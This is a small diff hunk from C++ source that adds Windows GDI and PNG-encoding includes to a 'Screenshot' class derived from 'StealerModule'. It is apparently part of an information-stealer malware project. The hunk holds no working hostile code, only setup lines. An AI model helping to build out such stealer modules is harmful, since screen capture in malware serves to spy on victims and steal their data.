@@ -7,6 +7,11 @@
 
 
 #include "../StealerModule.h"
+#include <wingdi.h>
+
+#define LODEPNG_NO_COMPILE_DISK
+#define LODEPNG_COMPILE_ENCODER
+#include "lodepng.h"
 
 class Screenshot : public StealerModule {
 public:
